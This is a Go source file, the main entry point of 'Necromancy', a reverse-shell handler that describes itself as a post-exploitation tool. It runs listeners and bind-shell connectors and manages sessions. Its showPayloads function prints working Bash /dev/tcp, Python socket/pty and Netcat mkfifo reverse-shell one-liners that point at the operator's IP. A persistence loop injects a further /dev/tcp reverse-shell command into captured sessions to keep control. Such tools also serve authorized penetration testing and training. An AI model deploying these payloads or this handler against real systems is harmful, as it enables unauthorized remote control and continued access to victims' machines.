package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/Aryma-f4/necromancy/core"
	"github.com/Aryma-f4/necromancy/server"
	"github.com/Aryma-f4/necromancy/ui"
	"github.com/Aryma-f4/necromancy/updater"
	"github.com/Aryma-f4/necromancy/utils"
	"golang.org/x/term"
)

// Version variables - will be set by build flags
var (
	Version   = "v1.5.1"
	BuildDate = "unknown"
)

func resolvedBuildDate() string {
	if strings.TrimSpace(BuildDate) != "" && BuildDate != "unknown" {
		return strings.ReplaceAll(BuildDate, "_", " ")
	}

	exePath, err := os.Executable()
	if err != nil {
		return "unknown"
	}

	info, err := os.Stat(exePath)
	if err != nil {
		return "unknown"
	}

	return info.ModTime().UTC().Format("2006-01-02 15:04:05")
}

func splitPorts(raw string) []string {
	var ports []string
	for _, part := range strings.Split(raw, ",") {
		part = strings.TrimSpace(part)
		if part != "" {
			ports = append(ports, part)
		}
	}
	return ports
}

func showPayloads(ports string, interfaceAddr string) {
	// Get network info for IP replacement
	networkInfo := utils.GetNetworkInfo()
	localIP := networkInfo["local_ip"]
	publicIP := networkInfo["public_ip"]
	if publicIP != "Unknown" && !utils.IsPrivateIP(publicIP) {
		localIP = publicIP // Use public IP if available
	}

	// Use the provided ports parameter
	if ports == "" {
		ports = "4444"
	}

	// If multiple ports, use the first one
	portList := strings.Split(ports, ",")
	firstPort := strings.TrimSpace(portList[0])

	fmt.Println("Available Reverse Shell Payloads:")
	fmt.Println("")
	fmt.Println("Bash:")
	fmt.Printf("bash -i >& /dev/tcp/%s/%s 0>&1\n", localIP, firstPort)
	fmt.Println("")
	fmt.Println("Python:")
	fmt.Printf(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`+"\n", localIP, firstPort)
	fmt.Println("")
	fmt.Println("Netcat:")
	fmt.Printf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n", localIP, firstPort)
}

func shouldUseTUI(forceHeadless bool) bool {
	if forceHeadless {
		return false
	}

	if os.Getenv("TERM") == "" || os.Getenv("TERM") == "dumb" {
		return false
	}

	return term.IsTerminal(int(os.Stdin.Fd())) && term.IsTerminal(int(os.Stdout.Fd()))
}

func runHeadless() {
	fmt.Println("[i] Running in headless mode")
	fmt.Println("[i] Suitable for VPS, tmux, systemd, nohup, and non-interactive shells")

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	for {
		sig := <-sigChan
		fmt.Printf("[i] Received signal %s, shutting down\n", sig.String())
		return
	}
}

func main() {
	printColoredBanner()
	time.Sleep(1 * time.Second) // Tambahkan delay seperti yang diminta

	// Display version info
	fmt.Printf("\n Version : %s ", Version)
	fmt.Printf("\n Build Date : %s UTC", resolvedBuildDate())
	fmt.Printf("\n Multi-platform post-exploitation tool with advanced features:\n\n")

	// Set version in updater package
	updater.SetVersion(Version)

	// Parse args
	core.InitConfig()
	flag.StringVar(&core.GlobalConfig.Ports, "p", "4444", "Port to listen on")
	flag.StringVar(&core.GlobalConfig.ServeDir, "s", "", "Run HTTP file server mode and serve directory")
	flag.StringVar(&core.GlobalConfig.Interface, "i", "0.0.0.0", "Local interface/IP to listen")
	flag.StringVar(&core.GlobalConfig.Connect, "c", "", "Bind shell Host")
	flag.IntVar(&core.GlobalConfig.Maintain, "m", 0, "Keep N sessions per target")
	flag.BoolVar(&core.GlobalConfig.NoLog, "L", false, "Disable session log files")
	flag.BoolVar(&core.GlobalConfig.NoUpgrade, "U", false, "Disable shell auto-upgrade")
	flag.BoolVar(&core.GlobalConfig.OSCPSafe, "O", false, "Enable OSCP-safe mode")
	flag.IntVar(&core.GlobalConfig.WebPort, "w", 8000, "HTTP server port")
	flag.StringVar(&core.GlobalConfig.URLPrefix, "prefix", "", "HTTP file server URL prefix")
	flag.BoolVar(&core.GlobalConfig.SingleSession, "S", false, "Accept only the first created session")
	flag.BoolVar(&core.GlobalConfig.NoAttach, "C", false, "Do not auto-attach on new sessions")

	var showPayloadHints bool
	var showInterfaces bool
	var showVersion bool
	var headless bool
	flag.BoolVar(&showPayloadHints, "a", false, "Show sample reverse shell payloads")
	flag.BoolVar(&showPayloadHints, "payloads", false, "Show sample reverse shell payloads")
	flag.BoolVar(&showInterfaces, "l", false, "List available network interfaces")
	flag.BoolVar(&showInterfaces, "interfaces", false, "List available network interfaces")
	flag.BoolVar(&showVersion, "v", false, "Print version and exit")
	flag.BoolVar(&showVersion, "version", false, "Print version and exit")
	flag.BoolVar(&headless, "headless", false, "Run without TUI for VPS/non-interactive environments")

	// Auto-update flags
	var checkUpdate bool
	var autoUpdate bool
	flag.BoolVar(&checkUpdate, "check-update", false, "Check for updates")
	flag.BoolVar(&autoUpdate, "update", false, "Auto-update to latest version")

	flag.Parse()

	// Handle auto-update functionality
	if autoUpdate {
		if err := updater.AutoUpdate(); err != nil {
			fmt.Printf("[-] Auto-update failed: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("[✓] Update completed. Please restart the application.")
		os.Exit(0)
	}

	if checkUpdate {
		updater.CheckAndNotify()
		os.Exit(0)
	}

	if showVersion {
		fmt.Printf("Necromancy %s\n", Version)
		os.Exit(0)
	}

	if showInterfaces {
		fmt.Print(core.GetInterfaces())
		os.Exit(0)
	}

	if showPayloadHints {
		// Get the port from the flag value since GlobalConfig might not be initialized yet
		port := "4444" // default
		for i, arg := range os.Args {
			if (arg == "-p" || arg == "--ports") && i+1 < len(os.Args) {
				port = os.Args[i+1]
				break
			}
		}
		// Get the interface from the flag value
		interfaceAddr := "0.0.0.0" // default
		for i, arg := range os.Args {
			if (arg == "-i" || arg == "--interface") && i+1 < len(os.Args) {
				interfaceAddr = os.Args[i+1]
				break
			}
		}
		showPayloads(port, interfaceAddr)
		os.Exit(0)
	}

	// Setup logging to file since stdout is used by tview
	f, err := os.OpenFile("necromancy-go.log", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		panic(err)
	}
	defer f.Close()
	log.SetOutput(f)
	log.Println("Starting Necromancy Go Rewrite (Advanced Mode)...")

	// Initialize core Session Manager
	sessions := core.NewSessionManager()

	// Start HTTP File Server if requested
	if core.GlobalConfig.ServeDir != "" {
		fsAddr := core.GlobalConfig.Interface + ":" + strconv.Itoa(core.GlobalConfig.WebPort)
		fs := server.NewFileServer(fsAddr, core.GlobalConfig.ServeDir, core.GlobalConfig.URLPrefix)
		go fs.Start()
	}

	useTUI := shouldUseTUI(headless)
	var app *ui.App
	if useTUI {
		app = ui.NewApp(sessions)
	}

	// Handle Listeners or Bind Shell connections
	if core.GlobalConfig.Connect != "" {
		for _, port := range splitPorts(core.GlobalConfig.Ports) {
			target := fmt.Sprintf("%s:%s", core.GlobalConfig.Connect, port)
			go core.ConnectBind(target, sessions, func(s *core.Session) {
				log.Printf("New Bind Session %d from %s\n", s.ID, s.RemoteAddr)
				if app != nil {
					app.UpdateSessionsList()
				}
			})
			fmt.Printf("[i] Connecting to bind shell at %s\n", target)
		}
	} else {
		// Reverse shell listeners
		for _, port := range splitPorts(core.GlobalConfig.Ports) {
			listenerAddr := core.GlobalConfig.Interface + ":" + port
			go core.StartListener(listenerAddr, sessions, func(s *core.Session) {
				log.Printf("New Reverse Session %d from %s\n", s.ID, s.RemoteAddr)
				if app != nil {
					app.UpdateSessionsList()
				}
			})
			fmt.Printf("[i] Listening on %s for reverse shells\n", listenerAddr)
		}
	}

	// Session Persistence Logic
	if core.GlobalConfig.Maintain > 0 {
		go func() {
			for {
				time.Sleep(10 * time.Second)
				all := sessions.GetAll()
				activeCount := len(all)
				if activeCount > 0 && activeCount < core.GlobalConfig.Maintain {
					log.Printf("Persistence: Active sessions (%d) < Target (%d). Attempting to spawn more...", activeCount, core.GlobalConfig.Maintain)
					// Ask the first active session to spawn another reverse shell
					s := all[0]
					// Use the first port from the configured ports
					ports := splitPorts(core.GlobalConfig.Ports)
					if len(ports) > 0 {
						port := ports[0] // Use the first port for persistence
						payload := fmt.Sprintf("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1 &' 2>/dev/null\n", core.GlobalConfig.Interface, port)
						s.Write([]byte(payload))
					}
				}
			}
		}()
	}

	if !useTUI {
		runHeadless()
		fmt.Println("Necromancy Go Exited cleanly.")
		return
	}

	fmt.Println("[i] Starting terminal UI...")
	fmt.Println("[i] Press 'h' for help, 'q' to quit")

	app.Setup()

	if err := app.Run(); err != nil {
		log.Fatalf("Error running application UI: %v\n", err)
	}

	fmt.Println("Necromancy Go Exited cleanly.")
}
